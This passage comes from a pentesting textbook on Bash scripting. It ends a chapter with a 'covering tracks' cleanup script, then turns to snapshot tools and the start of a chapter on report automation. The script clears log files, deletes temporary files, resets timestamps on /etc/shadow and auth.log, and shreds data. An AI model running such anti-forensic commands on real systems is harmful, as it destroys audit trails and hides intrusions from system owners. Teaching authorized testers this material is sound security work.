        sudo echo "" > "$file"
        echo "Cleared $file"
    fi
done
# Remove temporary files
identifier="pentester123"
find /tmp /var/tmp -user "$(whoami)" -name "*$identifier*" -type f -delete
# Modify timestamps
touch -r /etc/hosts /etc/passwd /etc/shadow /var/log/auth.log
# Securely remove sensitive files
shred -u -z -n 3 /tmp/sensitive_data.txt
# Flush ARP cache
sudo ip -s -s neigh flush all
echo "Cleanup completed"


     This script performs
    



     the
    


      following actions:
     





      Clears the
     


       Bash history
      




      Clears common
     


       log files
      




      Removes temporary files that were created during
     


       the assessment
      




      Modifies the timestamps of important
     


       system files
      




      Securely removes a
     


       sensitive file
      




      Flushes the
     


       ARP cache
      





     Remember, the effectiveness of these cleanup methods can vary depending on the system configuration and monitoring tools
    


      in place.
     




     Proper cleanup also relies on keeping detailed notes of your activities and knowing your tools.
    

     Use of the
    


      script
     


     and
    


      tee
     


     commands to save a log file of your activities is also helpful and can save the day when you eventually forget to take screenshots for the pentest report.
    

     Always be aware of the indicators of compromise that are left behind by your pentest tools.
    

     There are Windows and Linux tools that snapshot and compare before and after running exploits.
    

     This will enable you to properly vet new tools in an offline lab environment to ensure they’re trustworthy, as well as provide a snapshot of system changes you can expect
    



     from your tools
    


      and exploits.
     




     The following are a select few Linux
    


      snapshot tools:
     






       diff
      




        and cmp
       




       :
      





         diff
        


        : A
       



        command-line tool that compares files line by line and outputs the
       



        differences.
       

        It can be used to compare configuration files, logs, or other text-based files before and after running
       


         an exploit.
        





         cmp
        


        : Another
       



        command-line tool that compares two files
       



        byte by byte and is useful for binary
       


         file comparison.
        







       Tripwire
      


      : A popular integrity monitoring tool that can be used to create a baseline of the
     



      filesystem and compare it against the system’s
     



      state after an exploit.
     

      It can alert you to changes in files, directories,
     


       and configurations.
      





       Advanced Intrusion Detection Environment (AIDE)
      


      : AIDE creates a database of system
     



      files’ checksums, and
     



      it can be used to compare the system’s state before and after running an exploit to detect changes in files
     


       and directories.
      





       Linux Auditing System (Auditd)
      


      : Auditd
     



      allows you to monitor and log system calls and can be configured to track changes to files, directories, or even certain types of system activity.
     

      Comparing
     



      audit logs before and after running an exploit can help
     


       identify changes.
      





       OSSEC
      


      : An
     



      open-source
     


       host-based intrusion detection system
      


      (
     


       HIDS
      


      ) that can monitor system
     



      files, registry keys, and
     



      other critical areas for changes.
     

      It can be configured to alert you to modifications caused by
     


       an exploit.
      





     The following workflow will provide a snapshot of the changes that have been caused by a tool
    


      or exploit:
     






       Create a baseline snapshot
      


      : Use the selected tool to take a snapshot of the system before running the exploit.
     

      This snapshot will serve as the
     



        before
       




       state.
      





       Execute the exploit
      


      : Execute the exploit you’re testing on
     


       the system.
      





       Create a post-exploit snapshot
      


      : Use the same tool to take a snapshot of the system after running
     


       the exploit.
      





       Compare the snapshots
      


      : Use the comparison features of the tools to analyze the differences between the before and after snapshots, identifying any changes made by the exploit.
     

      This will help you log and analyze the impact of the exploit on
     


       the system.
      





     This section provided a comprehensive primer on cleaning up after yourself and covering tracks.
    

     Two good rules to operate by are to do no harm and clean up after yourself.
    

     Always follow the Statement of Work and Rules of Engagement documents, and communicate with any points of contact or system owners when
    


      in doubt.
     






     Summary
    



     This chapter explored the essential techniques of maintaining persistence and executing pivoting operations during pentesting, with a focus on utilizing the Bash shell.
    

     We began by examining the fundamentals of persistence, including methods to establish long-term access to compromised systems through cron jobs, startup scripts, and system service manipulation.
    

     The chapter then progressed to more sophisticated persistence techniques, providing pentesters with a comprehensive toolkit for ensuring
    


      continued access.
     




     The latter half of this chapter shifted focus to network pivoting, starting with basic concepts and moving on to advanced strategies.
    

     Here, we covered how to implement port forwarding and tunneling mechanisms using SSH and other tools.
    

     This chapter concluded with a section on cleanup procedures, detailing methods you can use to erase command histories, manage logs, and minimize any digital footprints that are left during the testing process.
    

     Throughout this chapter, practical Bash scripts and commands were provided, accompanied by clear explanations to ensure you can apply these techniques in real-world
    


      scenarios effectively.
     




     In the next chapter, we’ll explore pentest reporting using Bash scripting and tools we can use to process data from tool output and
    


      formulate reports.
     















     13
    





     Pentest Reporting with Bash
    



     In this chapter, we explore the role Bash can play in streamlining the
    


      reporting
     


     phase of pentesting.
    

     As security professionals know, the final report is a critical deliverable that communicates findings, risks, and recommendations to stakeholders.
    

     However, compiling these reports can be time-consuming and prone to inconsistencies.
    

     We’ll examine how Bash scripting can automate and enhance various aspects of the reporting process, from data collection to
    


      report generation.
     




     Throughout the chapter, we’ll cover techniques for automating data extraction from tool outputs, generating preliminary reports, and integrating Bash with other reporting tools.
    

     You’ll learn how to create scripts that can parse raw data and populate
    


      report templates.
     




     By the end of this chapter, you’ll have a solid foundation in using Bash to create efficient, accurate, and professional pentest reports.
    

     These skills will not only save time but also enhance the quality and consistency of your deliverables, allowing you to focus more on analysis and less on manual
    


      report compilation.
     




     In this chapter, we’re going to cover the following
    


      main topics:
     









      Automating data collection for reporting
     


       with Bash
      




      Storing and managing pentest data
     


       with SQLite
      




      Integrating Bash with
     


       reporting tools
      







     Technical requirements
    



     The code for this chapter can be found
    


      at
     




       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter13
      




      .
     




     Enter the following commands to install prerequisites on your Kali
    


      Linux system:
     



$ sudo apt install libxml2-utils jq sqlite3 texlive-base xmlstarlet


     The following commands assume that you have Go installed.
    


      See
     




       https://go.dev/doc/install
      




      :
     



$ go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
$ go install -v github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest


     With the prerequisites out of the way, it’s time to dive into reporting, every pentester’s
    


      favorite subject!
     






     Automating data collection for reporting with Bash
    



     Efficient
    



     data collection is a pillar of effective pentesting reporting.
    

     This section explores how to leverage Bash scripting to automate the gathering and
    



     organization of critical information from various phases of
    


      a pentest.
     




     By automating data collection, pentesters can do
    


      the following:
     





      Reduce manual errors in
     


       data gathering
      




      Standardize the format of
     


       collected information
      




      Save time on repetitive data
     


       extraction tasks
      




      Ensure consistency across multiple tests
     


       and reports
      





     We’ll examine techniques for identifying key data points, extracting information from tool outputs, cleaning raw data, storing data in a database, and templating reports.
    

     These methods will help streamline the reporting process and allow testers to focus more on analysis and less on
    


      data management.
     




     Let’s begin by looking at how to identify and extract the most relevant data for pentest reports
    


      using Bash.
     






     Identifying key data points
    




      Key data points
     


     are essential pieces
    



     of information that provide a comprehensive overview of the test findings, vulnerabilities, and overall security posture of the target system or network.
    

     These data points form the backbone of an effective
    


      pentest report.
     




     Key data points
    



     typically include
    


      the following:
     






       Executive
      




        summary data
       




       :
      




        Total number of vulnerabilities
       


         by severity
        




        Key findings and
       


         critical issues
        




        Overall
       


         risk rating
        








        Compliance information
       




       :
      




        Relevant compliance standards (e.g., PCI DSS
       


         and HIPAA)
        




        Specific compliance violations
       


         or gaps
        








        Test metadata
       




       :
      




        Date and duration of
       


         the test
        




        Scope of
       


         the assessment
        





         Tester information
        




        Tools used during
       


         the assessment
        







       Successful attacks
      




        or exploits
       




       :
      




        Description of successful
       


         penetration attempts
        




        Data accessed
       


         or exfiltrated
        




        Potential
       


         real-world consequences
        








        Vulnerability information
       




       :
      




        Vulnerability name
       


         and description
        




        Severity rating (e.g., Critical, High, Medium,
       


         or Low)
        





         Common Vulnerability Scoring System
        


        (
       



          CVSS
         




         ) score
        




        Affected systems
       


         or components
        








        Technical details
       




       :
      




        IP addresses and hostnames of
       


         affected systems
        




        Port numbers and
       


         services running
        




        Software versions and
       


         patch levels
        




        Exploit methods or proof
       


         of concept
        








        Risk assessment
       




       :
      




        Potential impact of
       


         each vulnerability
        




        Likelihood
       


         of exploitation
        




        Business
       


         impact analysis
        








        Testing artifacts
       




       :
      




        Screenshots of vulnerabilities
       


         or exploits
        




        Log
       


         file excerpts
        




        Command outputs
       


         from tools
        








        Remediation information
       




       :
      




        Recommended
       



        fixes
       


         or mitigations
        




        Priority
       


         of remediation
        




        Estimated effort
       


         for remediation
        









     Parsing and cleaning raw data using Bash
    



     Pentest
    



     tool’s primary
    



     report output formats include
    



     plain text files (
    


      .txt
     


     ),
    


      Comma-Separated Values
     


     (
    


      CSV
     


     ),
    


      Extensible Markup Language
     


     (
    


      XML
     


     ), and
    


      JavaScript Object Notation
     


     (
    


      JSON
     


     ).
    

     Since plain text output isn’t
    



     organized into any specific format, it won’t be covered in this section and
    



     what you previously learned about regular expressions in
